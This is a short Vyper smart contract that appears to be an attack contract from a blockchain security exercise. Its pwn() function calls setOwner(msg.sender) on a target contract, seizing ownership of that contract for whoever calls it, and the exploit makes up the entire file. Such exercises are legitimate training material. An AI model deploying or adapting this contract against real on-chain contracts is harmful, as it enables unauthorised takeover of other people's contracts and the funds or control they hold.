# @version ^0.3.7


interface Target:
    def setOwner(owner: address): nonpayable


target: public(Target)


@external
def __init__(target: address):
    self.target = Target(target)


@external
def pwn():
    self.target.setOwner(msg.sender)